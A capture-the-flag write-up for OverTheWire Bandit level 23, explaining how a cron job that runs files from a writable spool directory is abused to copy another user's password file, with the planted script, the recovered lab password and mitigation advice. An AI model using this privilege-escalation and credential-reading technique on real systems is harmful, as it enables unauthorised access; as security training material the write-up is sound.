# OverTheWire Bandit — Level 23

**Platform:** OverTheWire Bandit (free SSH wargame — no account, no payment)
**Lab type:** Linux fundamentals / cron jobs + script injection
**Difficulty:** Beginner
**Solved:** 26 November 2026
**Connection:** `ssh bandit23@bandit.labs.overthewire.org -p 2220` (password from Level 22)

## Objective

Find the password for bandit24: a cron job runs every minute as bandit24 and **executes every script** placed in `/var/spool/bandit24/foo` that is owned by bandit23.

## Solution

1. Log in as `bandit23` (password from Level 22).
2. Read the cron script:
   ```
   cat /usr/bin/cronjob_bandit24.sh
   ```
   Key part:
   ```bash
   cd /var/spool/"$myname"/foo
   for i in * .*; do
     owner="$(stat --format "%U" "./$i")"
     if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
       timeout -s 9 60 "./$i"
     fi
     rm -rf "./$i"
   done
   ```
   The job (running as bandit24) executes any file in `/var/spool/bandit24/foo` owned by bandit23, then deletes it.
3. Plant a script there that copies bandit24's password to `/tmp` (the script will run as bandit24, so it can read the password file):
   ```
   printf '#!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/b24pass\nchmod 644 /tmp/b24pass\n' > /var/spool/bandit24/foo/getpass.sh
   chmod +x /var/spool/bandit24/foo/getpass.sh
   ```
4. Wait ~70 seconds for the next cron run, then read the output:
   ```
   cat /tmp/b24pass
   ```
   Output: `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv`
5. **Backend note:** the game servers load-balance across `gibson-0` and `gibson-1`, and both `/var/spool` and `/tmp` are local to each backend — the script planted on one backend does not exist on the other. The first read landed on the other backend and found nothing, so the script was planted on **both** backends before it was picked up.

## Result

Password for bandit24: `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv` — verified by logging in as bandit24 (`whoami` → `bandit24`).

## Practical Explanation

- **Cron jobs that execute a directory of scripts are code execution by design.** Whoever can write a file into that directory, with the right owner, gets their code run as the cron user. The `owner = bandit23` check does not help — bandit23 *is* the attacker here.
- **The file is deleted after running,** so the window to notice is small — but the output file in `/tmp` persists.
- This is the classic "writable cron script directory" privilege escalation: a privileged scheduled job that runs untrusted files.

## Lessons Learned

- A cron job that runs files from a writable directory is equivalent to giving the writer the cron user's privileges.
- On load-balanced/multi-host systems, state in `/tmp` and spool directories is per-host — plant and check on the same host, or on all of them.

## Mitigation

- Cron jobs must only execute scripts from directories writable by root (or the job owner) — never from a directory another user can write to.
- Validate script contents (signatures/checksums) before executing, and never delete evidence of what ran.
